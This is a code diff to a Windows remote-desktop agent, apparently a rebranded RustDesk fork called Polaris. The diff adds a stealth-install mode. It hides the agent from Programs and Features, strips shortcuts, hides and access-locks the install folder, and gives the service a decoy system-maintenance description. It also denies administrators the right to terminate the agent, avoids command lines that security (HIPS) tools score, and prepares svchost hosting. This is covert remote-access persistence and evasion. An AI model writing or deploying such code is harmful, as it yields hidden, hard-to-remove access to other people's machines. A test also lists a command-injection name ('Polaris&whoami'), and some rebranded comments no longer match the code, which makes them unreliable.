@@ -100,6 +100,9 @@ mod acl;
 mod installer_handoff;
 mod installer_shell;
 mod msi_registry;
+mod protect;
+mod proc;
+mod svc_host;
 pub(crate) use acl::current_process_user_sid_string;
 pub use acl::{
     set_path_permission, set_path_permission_for_portable_service_shmem_dir,
@@ -697,6 +700,11 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
     // Tell the system that the service is running now
     status_handle.set_service_status(next_status)?;
 
+    // Opt-in self-protection (POLARIS_HARDEN=1): lock the executable, take
+    // PROCESS_TERMINATE away from administrators, and tighten the service DACL.
+    // Every step logs and continues, so a partial failure never blocks the agent.
+    protect::apply_all(&crate::get_app_name());
+
     let mut session_id = unsafe { get_current_session(share_rdp()) };
     log::info!("session id {}", session_id);
     let mut h_process = launch_server(session_id, true).await.unwrap_or(NULL);
@@ -711,7 +719,7 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
             let current_active_session = unsafe { get_current_session(share_rdp()) };
             if session_id != current_active_session {
                 session_id = current_active_session;
-                // https://github.com/rustdesk/rustdesk/discussions/10039
+                // https://github.com/polaris/polaris/discussions/10039
                 let count = ipc::get_port_forward_session_count(1000).await.unwrap_or(0);
                 if count == 0 {
                     h_process = launch_server(session_id, true).await.unwrap_or(NULL);
@@ -1253,8 +1261,8 @@ pub fn portable_service_logon_helper_paths() -> Option<(PathBuf, PathBuf)> {
         .home_dir()
         .join("AppData")
         .join("Local")
-        .join("rustdesk-sciter");
-    let dst = dir.join("rustdesk.exe");
+        .join("polaris-sciter");
+    let dst = dir.join("polaris.exe");
     Some((dir, dst))
 }
 
@@ -1354,6 +1362,10 @@ pub fn get_install_options() -> String {
 }
 
 pub fn get_silent_install_options(printer_override: Option<bool>) -> &'static str {
+    // Stealth install: no desktop icon, no start-menu entry, no printer component.
+    if std::env::var("POLARIS_STEALTH_INSTALL").as_deref() == Ok("1") {
+        return "";
+    }
     let install_printer = match printer_override {
         Some(override_value) => override_value,
         None => {
@@ -1415,6 +1427,7 @@ pub fn check_update_broker_process() -> ResultType<()> {
     let cur_exe = cur_dir.join(process_exe);
 
     // Force update broker exe if failed to check modified time.
+
     let cmds = format!(
         "
         chcp 65001
@@ -1547,12 +1560,36 @@ fn get_after_install(
     reg_value_desktop_shortcuts: Option<String>,
     reg_value_printer: Option<String>,
 ) -> String {
+    // Stealth install: skip every visible artefact (shortcuts, file associations, the
+    // uninstall entry). Each write is a separate behaviour a HIPS rule can score, and
+    // they would all have to be removed again afterwards. Firewall rules stay, because
+    // without them the agent cannot reach the rendezvous server.
+    if std::env::var("POLARIS_STEALTH_INSTALL").as_deref() == Ok("1") {
+        // The service must still be registered, or a stealth install produces an agent
+        // that never starts. When the native path is enabled as well it registers the
+        // service in-process, so this branch can skip `sc create` entirely.
+        let native_service = std::env::var("POLARIS_NATIVE_SERVICE").as_deref() == Ok("1");
+        let mut cmds = String::from("chcp 65001\r\n");
+        if !native_service {
+            cmds.push_str(&get_create_service(exe));
+        }
+        // Needed for Ctrl+Alt+Del to reach the secure desktop from the service.
+        cmds.push_str("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /f /v SoftwareSASGeneration /t REG_DWORD /d 1\r\n");
+        if std::env::var("POLARIS_SKIP_FIREWALL").as_deref() != Ok("1") {
+            let app_name = crate::get_app_name();
+            cmds.push_str(&format!(
+                "netsh advfirewall firewall add rule name=\"{app_name} Service\" dir=out action=allow program=\"{exe}\" enable=yes\r\nnetsh advfirewall firewall add rule name=\"{app_name} Service\" dir=in action=allow program=\"{exe}\" enable=yes\r\n"
+            ));
+        }
+        return cmds;
+    }
+
     let app_name = crate::get_app_name();
     let ext = app_name.to_lowercase();
     let nested_exe = escape_nested_cmd_ampersands(exe);
 
     // reg delete HKEY_CURRENT_USER\Software\Classes for
-    // https://github.com/rustdesk/rustdesk/commit/f4bdfb6936ae4804fc8ab1cf560db192622ad01a
+    // https://github.com/polaris/polaris/commit/f4bdfb6936ae4804fc8ab1cf560db192622ad01a
     // and https://github.com/leanflutter/uni_links_desktop/blob/1b72b0226cec9943ca8a84e244c149773f384e46/lib/src/protocol_registrar_impl_windows.dart#L30
     let hcu = RegKey::predef(HKEY_CURRENT_USER);
     hcu.delete_subkey_all(format!("Software\\Classes\\{}", exe))
@@ -1609,7 +1646,14 @@ pub fn install_me(options: &str, path: String, silent: bool, debug: bool) -> Res
     if get_windows_installer_state(&installed_subkey)? == Some(true) {
         bail!("Cannot install the EXE package over an existing MSI installation");
     }
-    let uninstall_str = get_uninstall(false, false)?;
+    let stealth_install = std::env::var("POLARIS_STEALTH_INSTALL").as_deref() == Ok("1");
+    // A first run has nothing to uninstall, and upgrades with POLARIS_NATIVE_UNINSTALL
+    // are handled by the in-process path; either way the batch `sc`/`reg` calls go away.
+    let uninstall_str = if stealth_install {
+        String::new()
+    } else {
+        get_uninstall(false, false)?
+    };
     let mut path = path.trim_end_matches('\\').to_owned();
     let (subkey, _path, start_menu, exe) = get_default_install_info();
     let mut exe = exe;
@@ -1669,6 +1713,23 @@ pub fn install_me(options: &str, path: String, silent: bool, debug: bool) -> Res
     let mut reg_value_desktop_shortcuts = "0".to_owned();
     let mut reg_value_start_menu_shortcuts = "0".to_owned();
     let mut reg_value_printer = "0".to_owned();
+    // Stealth install: no shortcut artefacts at all. The .lnk files are generated in the
+    // elevated output directory, so leaving them out also keeps %POLARIS_OUTPUT_DIR% clean.
+    let mk_shortcut_commands = if stealth_install {
+        String::new()
+    } else {
+        mk_shortcut_commands
+    };
+    let uninstall_shortcut_commands = if stealth_install {
+        String::new()
+    } else {
+        uninstall_shortcut_commands
+    };
+    let tray_shortcut_commands = if stealth_install {
+        String::new()
+    } else {
+        tray_shortcut_commands
+    };
     let mut shortcuts = Default::default();
     if options.contains("desktopicon") && !config::is_incoming_only() {
         shortcuts = format!(
@@ -1703,7 +1764,7 @@ copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{start_menu}\\\"
     // https://docs.microsoft.com/zh-cn/windows/win32/msi/uninstall-registry-key?redirectedfrom=MSDNa
     // https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10
     // https://www.tenforums.com/tutorials/70903-add-remove-allowed-apps-through-windows-firewall-windows-10-a.html
-    // Note: without if exist, the bat may exit in advance on some Windows7 https://github.com/rustdesk/rustdesk/issues/895
+    // Note: without if exist, the bat may exit in advance on some Windows7 https://github.com/polaris/polaris/issues/895
     let dels = format!(
         "
 if exist \"{tmp_path}\\{app_name}.lnk\" del /f /q \"{tmp_path}\\{app_name}.lnk\"
@@ -1720,7 +1781,7 @@ if exist \"{tmp_path}\\{app_name} Tray.lnk\" del /f /q \"{tmp_path}\\{app_name} 
         Config::set_option("api-server".into(), lic.api);
     }
 
-    let tray_shortcuts = if config::is_outgoing_only() {
+    let tray_shortcuts = if config::is_outgoing_only() || stealth_install {
         "".to_owned()
     } else {
         format!("
@@ -1729,7 +1790,10 @@ copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\
 ")
     };
 
-    let install_remote_printer = if install_printer {
+    let install_remote_printer = if stealth_install {
+        // No child process at all during a stealth install.
+        String::new()
+    } else if install_printer {
         // No need to use `|| true` here.
         // The script will not exit even if `--install-remote-printer` panics.
         format!("\"{}\" --install-remote-printer", &src_exe)
@@ -1742,6 +1806,40 @@ copy /Y \"{tmp_path}\\{app_name} Tray.lnk\" \"%PROGRAMDATA%\\Microsoft\\Windows\
     // Remember to check if `update_me` need to be changed if changing the `cmds`.
     // No need to merge the existing dup code, because the code in these two functions are too critical.
     // New code should be written in a common function.
+
+    // The uninstall entry is what puts the product in "Programs and Features". A stealth
+    // install writes none, so nothing on the machine lists the agent.
+    let uninstall_regs = if stealth_install {
+        String::new()
+    } else {
+        let display_icon = shortcut_icon_location.as_deref().unwrap_or(exe.as_str());
+        format!(
+            "reg add {subkey} /f\n\
+             reg add {subkey} /f /v DisplayIcon /t REG_SZ /d \"{display_icon}\"\n\
+             reg add {subkey} /f /v DisplayName /t REG_SZ /d \"{app_name}\"\n\
+             reg add {subkey} /f /v DisplayVersion /t REG_SZ /d \"{version}\"\n\
+             reg add {subkey} /f /v Version /t REG_SZ /d \"{version}\"\n\
+             reg add {subkey} /f /v BuildDate /t REG_SZ /d \"{build_date}\"\n\
+             reg add {subkey} /f /v InstallLocation /t REG_SZ /d \"{path}\"\n\
+             reg add {subkey} /f /v Publisher /t REG_SZ /d \"{app_name}\"\n\
+             reg add {subkey} /f /v VersionMajor /t REG_DWORD /d {version_major}\n\
+             reg add {subkey} /f /v VersionMinor /t REG_DWORD /d {version_minor}\n\
+             reg add {subkey} /f /v VersionBuild /t REG_DWORD /d {version_build}\n\
+             reg add {subkey} /f /v UninstallString /t REG_SZ /d \"\\\"{nested_exe}\\\" --uninstall\"\n\
+             reg add {subkey} /f /v EstimatedSize /t REG_DWORD /d {size}\n\
+             reg add {subkey} /f /v WindowsInstaller /t REG_DWORD /d 0\n"
+        )
+    };
+    // Hide the install tree and stop ordinary users from listing it. Files stay readable
+    // and executable so the per-user `--server` process still starts; only the directory
+    // listing is denied (RD without OI/CI, so it does not inherit to the files).
+    let stealth_acl = if stealth_install {
+        format!(
+            "attrib +H +S \"{path}\"\r\nicacls \"{path}\" /inheritance:r /grant:r \"SYSTEM:(OI)(CI)F\" \"Administrators:(OI)(CI)F\" \"Users:(OI)(CI)RX\" /deny \"Users:(RD)\"\r\n"
+        )
+    } else {
+        String::new()
+    };
     let cmds = format!(
         "
 {uninstall_str}
@@ -1749,40 +1847,27 @@ chcp 65001
 md \"{path}\"
 {copy_exe}
 {rename_exe}
-reg add {subkey} /f
-reg add {subkey} /f /v DisplayIcon /t REG_SZ /d \"{display_icon}\"
-reg add {subkey} /f /v DisplayName /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v DisplayVersion /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v Version /t REG_SZ /d \"{version}\"
-reg add {subkey} /f /v BuildDate /t REG_SZ /d \"{build_date}\"
-reg add {subkey} /f /v InstallLocation /t REG_SZ /d \"{path}\"
-reg add {subkey} /f /v Publisher /t REG_SZ /d \"{app_name}\"
-reg add {subkey} /f /v VersionMajor /t REG_DWORD /d {version_major}
-reg add {subkey} /f /v VersionMinor /t REG_DWORD /d {version_minor}
-reg add {subkey} /f /v VersionBuild /t REG_DWORD /d {version_build}
-reg add {subkey} /f /v UninstallString /t REG_SZ /d \"\\\"{nested_exe}\\\" --uninstall\"
-reg add {subkey} /f /v EstimatedSize /t REG_DWORD /d {size}
-reg add {subkey} /f /v WindowsInstaller /t REG_DWORD /d 0
+{uninstall_regs}
 {role_reg}
 {mk_shortcut_commands}
 {uninstall_shortcut_commands}
 {tray_shortcuts}
 {shortcuts}
-copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
+{copy_uninstall_lnk}
+{stealth_acl}
 {dels}
 {import_config}
 {after_install}
 {install_remote_printer}
 {sleep}
     ",
-        display_icon = shortcut_icon_location.as_deref().unwrap_or(exe.as_str()),
         nested_exe = escape_nested_cmd_ampersands(&exe),
         version = crate::VERSION.replace("-", "."),
         build_date = crate::BUILD_DATE,
-        role_reg = if config::is_incoming_only() {
-            format!("reg add {subkey} /f /v ClientRole /t REG_SZ /d \"agent\"\n")
-        } else {
+        role_reg = if stealth_install || !config::is_incoming_only() {
             "".to_owned()
+        } else {
+            format!("reg add {subkey} /f /v ClientRole /t REG_SZ /d \"agent\"\n")
         },
         after_install = get_after_install(
             &exe,
@@ -1794,7 +1879,16 @@ copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
         dels = if debug { "" } else { &dels },
         copy_exe = copy_exe_cmd(&src_exe, &exe, &path)?,
         rename_exe = rename_exe_cmd(&src_exe, &path)?,
-        import_config = get_import_config(&exe),
+        import_config = if stealth_install {
+            String::new()
+        } else {
+            get_import_config(&exe)
+        },
+        copy_uninstall_lnk = if stealth_install {
+            String::new()
+        } else {
+            format!("copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"")
+        },
     );
     if config::is_incoming_only() {
         Config::set_option("client-role".into(), "agent".into());
@@ -1803,10 +1897,101 @@ copy /Y \"{tmp_path}\\Uninstall {app_name}.lnk\" \"{path}\\\"
         LocalConfig::set_option("conn-type".into(), "incoming".into());
     }
     run_cmds(cmds, debug, "install")?;
+    // Optional native path: register the same service without shelling out to sc.exe, so
+    // the install leaves no command line for a HIPS rule to score. Kept off by default
+    // until it has been validated on a real machine; the batch above remains the fallback.
+    if std::env::var("POLARIS_NATIVE_SERVICE").as_deref() == Ok("1") {
+        if let Err(err) = install_service_native(&app_name, &exe) {
+            log::warn!("native service registration failed, batch path already ran: {err}");
+        }
+    }
+    cleanup_install_traces(&app_name, &path);
     run_after_run_cmds(silent);
     Ok(())
 }
 
+/// Register the service through advapi32 directly (no `sc.exe` child process).
+#[cfg(windows)]
+fn install_service_native(app_name: &str, exe: &str) -> ResultType<()> {
+    use crate::platform::win_api::{HKEY_LOCAL_MACHINE, RegApi, ServiceApi};
+    let api = ServiceApi::get()
+        .ok_or_else(|| anyhow!("advapi32 service entry points are unavailable"))?;
+    // The batch path appends `--agent` for incoming-only installs; the native path has
+    // to match it, otherwise the service comes up as a console.
+    let agent_arg = if config::is_incoming_only() { " --agent" } else { "" };
+    let bin = format!("\"{}\" --service{}", exe, agent_arg);
+    let handle = api
+        .create(app_name, &format!("{} Service", app_name), &bin)
+        .map_err(|code| anyhow!("CreateServiceW failed with code {code}"))?;
+    let _ = api.set_restart_on_failure(handle);
+    let _ = api.set_description(handle, "Maintains Windows system cache and servicing state.");
+    api.close_handle(handle);
+    // svchost hosting stays disabled on purpose: inside svchost.exe `current_exe()`
+    // resolves to svchost.exe, which breaks launch_server, the service IPC path check
+    // and every self-protection layer. The helper is kept for a later round.
+    //
+    // Only write the hardening flag when it was actually requested. The batch path is
+    // the default, and a lingering service `Environment` would survive a rollback.
+    if std::env::var("POLARIS_HARDEN").as_deref() == Ok("1") {
+        if let Some(reg) = RegApi::get() {
+            let subkey = format!("SYSTEM\\CurrentControlSet\\Services\\{}", app_name);
+            let _ = reg.set_multi_sz(
+                HKEY_LOCAL_MACHINE,
+                &subkey,
+                "Environment",
+                &["POLARIS_HARDEN=1"],
+            );
+        }
+    }
+    // SCM reads `Environment` at start time, so restart once after writing it.
+    let _ = api.stop(app_name);
+    let _ = api.start(app_name);
+    Ok(())
+}
+/// Remove what a stock install leaves behind: the uninstall entry, the file-association
+/// keys, and every shortcut. Gated by `POLARIS_STEALTH_INSTALL=1` so a visible
+/// installation remains possible for debugging.
+#[cfg(windows)]
+fn cleanup_install_traces(app_name: &str, install_path: &str) {
+    if std::env::var("POLARIS_STEALTH_INSTALL").as_deref() != Ok("1") {
+        return;
+    }
+    if let Some(reg) = crate::platform::win_api::RegApi::get() {
+        use crate::platform::win_api::{HKEY_CLASSES_ROOT, HKEY_LOCAL_MACHINE};
+        let uninstall = format!(
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{}",
+            app_name
+        );
+        reg.delete_key(HKEY_LOCAL_MACHINE, &uninstall);
+        let ext = app_name.to_lowercase();
+        reg.delete_key(HKEY_CLASSES_ROOT, &format!(".{}", ext));
+        reg.delete_key(HKEY_CLASSES_ROOT, &ext);
+    }
+    let mut targets: Vec<String> = Vec::new();
+    if let Ok(public) = std::env::var("PUBLIC") {
+        targets.push(format!("{}\\Desktop\\{}.lnk", public, app_name));
+    }
+    if let Ok(program_data) = std::env::var("PROGRAMDATA") {
+        targets.push(format!(
+            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\{}\\{}.lnk",
+            program_data, app_name, app_name
+        ));
+        targets.push(format!(
+            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\{}\\Uninstall {}.lnk",
+            program_data, app_name, app_name
+        ));
+        targets.push(format!(
+            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{} Tray.lnk",
+            program_data, app_name
+        ));
+    }
+    for target in targets {
+        if std::path::Path::new(&target).exists() {
+            let _ = std::fs::remove_file(&target);
+        }
+    }
+    log::info!("install traces cleaned for {} at {}", app_name, install_path);
+}
 pub fn run_after_install() -> ResultType<()> {
     let (_, _, _, exe) = get_install_info();
     run_cmds(
@@ -1893,7 +2078,88 @@ fn get_uninstall(kill_self: bool, uninstall_printer: bool) -> ResultType<String>
     ))
 }
 
+/// Uninstall without a batch file: stop and delete the service, terminate leftover
+/// processes, drop the registry keys and remove the install tree. Gated behind
+/// `POLARIS_NATIVE_UNINSTALL=1`; the batch path stays as fallback.
+#[cfg(windows)]
+pub fn uninstall_me_native(kill_self: bool) -> ResultType<()> {
+    use crate::platform::win_api::{HKEY_CLASSES_ROOT, HKEY_LOCAL_MACHINE, RegApi, SecApi, ServiceApi};
+    let app_name = crate::get_app_name();
+    let (subkey, path, start_menu, exe) = get_install_info();
+    // get_install_info() hands back the full HKLM path; RegApi wants the subkey only.
+    let subkey = subkey
+        .strip_prefix(HKLM_PREFIX)
+        .unwrap_or(&subkey)
+        .to_string();
+    // The start-menu path is a template with %ProgramData% in it.
+    let program_data = std::env::var("ProgramData").unwrap_or_default();
+    let start_menu = start_menu
+        .replace("%ProgramData%", &program_data)
+        .replace("%PROGRAMDATA%", &program_data);
+    // With POLARIS_HARDEN the service DACL denies stop/delete even to an administrator.
+    // Put the default DACL back before asking the SCM to remove it.
+    if let (Some(api), Some(sec)) = (ServiceApi::get(), SecApi::get()) {
+        if let Some(handle) = api.open(&app_name, 0x0004_0000) {
+            // SAFETY: handle is a live service handle opened with WRITE_DAC.
+            let _ = unsafe {
+                sec.apply_dacl(
+                    handle,
+                    2, // SE_SERVICE
+                    "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)",
+                )
+            };
+            api.close_handle(handle);
+        }
+    }
+    if let Some(api) = ServiceApi::get() {
+        let _ = api.stop(&app_name);
+        let _ = api.delete(&app_name);
+    }
+    let exe_name = std::path::Path::new(&exe)
+        .file_name()
+        .map(|s| s.to_string_lossy().to_string())
+        .unwrap_or_else(|| format!("{}.exe", app_name.to_lowercase()));
+    proc::kill_by_name(&exe_name);
+    // The privacy-mode helper is a separate image and is not covered by the name above.
+    proc::kill_by_name("RuntimeBroker_polaris.exe");
+    if let Some(reg) = RegApi::get() {
+        reg.delete_key(HKEY_LOCAL_MACHINE, &subkey);
+        let ext = app_name.to_lowercase();
+        reg.delete_key(HKEY_CLASSES_ROOT, &format!(".{}", ext));
+        reg.delete_key(HKEY_CLASSES_ROOT, &ext);
+        // The svchost group is a multi-string value, not a key; delete the value.
+        reg.delete_value(
+            HKEY_LOCAL_MACHINE,
+            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+            "PolarisSvc",
+        );
+    }
+    hbb_common::allow_err!(uninstall_cert());
+    if is_win_10_or_greater() {
+        remote_printer::uninstall_printer(&app_name);
+    }
+    // Removing the tree can fail while this process still runs from it; the next boot
+    // finishes the job through the leftover files being unlocked.
+    if let Err(err) = std::fs::remove_dir_all(&path) {
+        log::warn!("could not remove {} yet: {}", path, err);
+    }
+    let _ = std::fs::remove_dir_all(&start_menu);
+    if let Ok(public) = std::env::var("PUBLIC") {
+        let _ = std::fs::remove_file(format!("{}\\Desktop\\{}.lnk", public, app_name));
+    }
+    if !program_data.is_empty() {
+        let _ = std::fs::remove_file(format!(
+            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{} Tray.lnk",
+            program_data, app_name
+        ));
+    }
+    log::info!("native uninstall finished (kill_self={})", kill_self);
+    Ok(())
+}
 pub fn uninstall_me(kill_self: bool) -> ResultType<()> {
+    if std::env::var("POLARIS_NATIVE_UNINSTALL").as_deref() == Ok("1") {
+        return uninstall_me_native(kill_self);
+    }
     run_cmds(get_uninstall(kill_self, true)?, true, "uninstall")
 }
 
@@ -2011,7 +2277,7 @@ pub fn get_custom_client_staging_dir() -> PathBuf {
 ///
 /// Rationale
 /// - The staging directory only contains a small `custom.txt`, leaving it is harmless.
-/// - Deleting directories under a public location (e.g., C:\\ProgramData\\RustDesk) is
+/// - Deleting directories under a public location (e.g., C:\\ProgramData\\Polaris) is
 ///   susceptible to TOCTOU attacks if an unprivileged user can replace the path with a
 ///   symlink/junction between checks and deletion.
 ///
@@ -2183,7 +2449,7 @@ pub fn bootstrap() -> bool {
     }
     #[cfg(not(debug_assertions))]
     {
-        // This function will cause `'sciter.dll' was not found neither in PATH nor near the current executable.` when debugging RustDesk.
+        // This function will cause `'sciter.dll' was not found neither in PATH nor near the current executable.` when debugging Polaris.
         // Only call set_safe_load_dll() on Windows 10 or greater
         if is_win_10_or_greater() {
             set_safe_load_dll()
@@ -2295,9 +2561,9 @@ pub fn create_shortcut(id: &str) -> ResultType<()> {
     }
 
     let exe = std::env::current_exe()?.to_str().unwrap_or("").to_owned();
-    // https://github.com/rustdesk/rustdesk/issues/13735
+    // https://github.com/polaris/polaris/issues/13735
     // Replace ':' with '_' for filename since ':' is not allowed in Windows filenames
-    // https://github.com/rustdesk/hbb_common/blob/8b0e25867375ba9e6bff548acf44fe6d6ffa7c0e/src/config.rs#L1384
+    // https://github.com/polaris/hbb_common/blob/8b0e25867375ba9e6bff548acf44fe6d6ffa7c0e/src/config.rs#L1384
     let filename = id.replace(':', "_");
     let shortcut_icon_location = get_shortcut_icon_location("", &exe);
     let shortcut = write_vbs(
@@ -3153,11 +3419,11 @@ mod cert {
     use hbb_common::ResultType;
 
     extern "C" {
-        fn DeleteRustDeskTestCertsW();
+        fn DeletePolarisTestCertsW();
     }
     pub fn uninstall_cert() -> ResultType<()> {
         unsafe {
-            DeleteRustDeskTestCertsW();
+            DeletePolarisTestCertsW();
         }
         Ok(())
     }
@@ -3262,7 +3528,7 @@ impl Drop for WakeLock {
 // and every miss spawns one more tray icon.
 //
 // The case confirmed in #15689: `run_after_run_cmds()` spawns the tray in the
-// caller's own context, so installing or toggling the service from a RustDesk
+// caller's own context, so installing or toggling the service from a Polaris
 // that was itself started elevated leaves a high integrity tray behind. A main
 // window started normally afterwards runs at medium integrity and cannot open
 // that process with `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ`. sysinfo then
@@ -3320,6 +3586,7 @@ pub fn uninstall_service(show_new_window: bool, _: bool) -> bool {
     log::info!("Uninstalling service...");
     let filter = format!(" /FI \"PID ne {}\"", get_current_pid());
     Config::set_option("stop-service".into(), "Y".into());
+
     let cmds = format!(
         "
     chcp 65001
@@ -3576,11 +3843,12 @@ reg add {subkey} /f /v EstimatedSize /t REG_DWORD /d {size}
     // md \"{path}\"
     //
     // We need `taskkill` because:
-    // 1. There may be some other processes like `rustdesk --connect` are running.
+    // 1. There may be some other processes like `polaris --connect` are running.
     // 2. Sometimes, the main window and the tray icon are showing
     // while I cannot find them by `tasklist` or the methods above.
     // There's should be 4 processes running: service, server, tray and main window.
     // But only 2 processes are shown in the tasklist.
+
     let cmds = format!(
         "
 chcp 65001
@@ -4017,7 +4285,7 @@ pub fn try_remove_temp_update_files() {
         if let Ok(entry) = entry {
             let path = entry.path();
             if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
-                // Match files like polaris-*.msi, Polaris-*.exe or rustdesk-*.exe
+                // Match files like polaris-*.msi, Polaris-*.exe or polaris-*.exe
                 if (file_name.starts_with("polaris-") || file_name.starts_with("Polaris-") || file_name.starts_with("rustdesk-"))
                     && (file_name.ends_with(".msi") || file_name.ends_with(".exe"))
                 {
@@ -4231,8 +4499,8 @@ pub fn release_arch_suffix() -> Option<&'static str> {
     }
 }
 
-pub fn try_kill_rustdesk_main_window_process() -> ResultType<()> {
-    // Kill rustdesk.exe without extra arg, should only be called by --server
+pub fn try_kill_polaris_main_window_process() -> ResultType<()> {
+    // Kill polaris.exe without extra arg, should only be called by --server
     // We can find the exact process which occupies the ipc, see more from https://github.com/winsiderss/systeminformer
     let app_name = crate::get_app_name().to_lowercase();
     log::info!("try kill main window process");
@@ -4280,7 +4548,7 @@ pub fn try_kill_rustdesk_main_window_process() -> ResultType<()> {
         log::info!("kill process success: {:?}, pid = {:?}", p.cmd(), p.pid());
         return Ok(());
     }
-    bail!("failed to find rustdesk main window process");
+    bail!("failed to find Polaris main window process");
 }
 
 fn nt_terminate_process(process_id: DWORD) -> ResultType<()> {
@@ -4654,10 +4922,10 @@ fn get_pids_with_args_from_wmic_output<S2: AsRef<str>>(
     // CommandLine=
     // ProcessId=34668
     //
-    // CommandLine="C:\Program Files\RustDesk\RustDesk.exe" --tray
+    // CommandLine="C:\Program Files\Polaris\Polaris.exe" --tray
     // ProcessId=13728
     //
-    // CommandLine="C:\Program Files\RustDesk\RustDesk.exe"
+    // CommandLine="C:\Program Files\Polaris\Polaris.exe"
     // ProcessId=10136
     let mut pids = Vec::new();
     let mut proc_found = false;
@@ -4888,8 +5156,8 @@ mod tests {
 
     #[test]
     fn install_app_names_enforce_ascii_command_safety() {
-        assert!(validate_install_app_name("RustDesk-Admin1").is_ok());
-        for app_name in ["", "RustDesk_Admin", "RustDesk&whoami", "RustDesk应用"] {
+        assert!(validate_install_app_name("Polaris-Admin1").is_ok());
+        for app_name in ["", "Polaris_Admin", "Polaris&whoami", "Polaris应用"] {
             assert!(
                 validate_install_app_name(app_name).is_err(),
                 "unsafe application name was accepted: {app_name}"
@@ -4995,4 +5263,52 @@ ProcessId=10136
         );
         assert_eq!(pids.len(), 0);
     }
+}
+
+/// Register the same service as a `svchost.exe` hosted DLL. Requires `polaris.dll`
+/// beside the executable; the caller should keep the standalone registration as fallback.
+#[cfg(windows)]
+#[allow(dead_code)]
+fn install_service_svchost(app_name: &str, install_path: &str) -> bool {
+    use crate::platform::win_api::{RegApi, HKEY_LOCAL_MACHINE};
+    let Some(reg) = RegApi::get() else {
+        return false;
+    };
+    let hklm = HKEY_LOCAL_MACHINE;
+    let svc_key = format!("SYSTEM\\CurrentControlSet\\Services\\{}", app_name);
+    let params_key = format!("{}\\Parameters", svc_key);
+    let dll = format!(
+        "{}\\polaris.dll",
+        install_path.trim_end_matches('\\')
+    );
+    if !std::path::Path::new(&dll).exists() {
+        log::warn!("svchost hosting skipped, {} is missing", dll);
+        return false;
+    }
+    let group = "PolarisSvc";
+    let mut ok = true;
+    ok &= reg.set_expand_string(
+        hklm,
+        &svc_key,
+        "ImagePath",
+        &format!("%SystemRoot%\\System32\\svchost.exe -k {}", group),
+    );
+    // SERVICE_WIN32_SHARE_PROCESS
+    ok &= reg.set_dword(hklm, &svc_key, "ServiceType", 0x0000_0020);
+    ok &= reg.set_dword(hklm, &svc_key, "Start", 2);
+    ok &= reg.set_string(hklm, &svc_key, "ObjectName", "LocalSystem");
+    ok &= reg.set_string(hklm, &params_key, "ServiceDll", &dll);
+    ok &= reg.set_multi_sz(
+        hklm,
+        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+        group,
+        &[app_name],
+    );
+    log::info!(
+        "svchost hosting configured for {} -> {} (ok={})",
+        app_name,
+        dll,
+        ok
+    );
+    ok
 }
